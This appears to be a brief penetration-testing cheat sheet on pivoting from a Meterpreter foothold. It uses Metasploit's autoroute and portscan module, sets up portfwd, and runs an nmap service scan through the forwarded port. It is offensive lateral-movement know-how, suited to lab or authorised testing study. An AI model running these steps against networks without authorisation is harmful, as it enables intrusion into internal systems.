After gaining a meterpreter shell to initial foothold, set up the autoroute for within the network
```
# Meterpreter
run autoroute -s <foothold ip>/<CIDR>
```

```
# Background meterpreter session then portscan
use auxiliary/scanner/portscan/tcp
```


Forward the port that you want to service scan based on portscan output
```
# Connect back to our pivot point
sessions -i 1

# Set up the port forward
portfwd add -l <listening port> -p <target port> -r <target ip>

# Output current forwarded ports
portfwd list
```

Service scan the forwarded port through nmap
```
# From your local (attacker) host
nmap -Pn -sV -p <forwarded port> localhost
```

50, 51
